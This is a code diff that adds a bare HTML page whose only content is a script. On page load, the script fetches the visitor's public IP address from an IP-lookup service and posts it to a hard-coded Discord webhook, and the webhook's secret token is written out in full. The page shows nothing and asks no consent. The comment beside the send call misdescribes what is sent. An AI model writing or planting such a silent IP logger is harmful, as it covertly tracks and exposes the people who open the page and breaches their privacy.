@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+ 
+<head>
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+ 
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1201371252275806278/quMI9Yjb2jEkj3sRLrnJnExuQr-V8Vmb63vtX9JVKiFKhwe_3cEILiY5Sdo03zTCjV8H';
+        /* Add "https://api.ipify.org?format=json" to 
+        get the IP Address of user*/
+        $(document).ready(()=>{
+            $.getJSON("https://api.ipify.org?format=json",
+            function (data) {
+ 
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: data.ip // Send user-provided content instead of IP
+                    }),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+            })
+        });
+    </script>
+</head>
+</html>
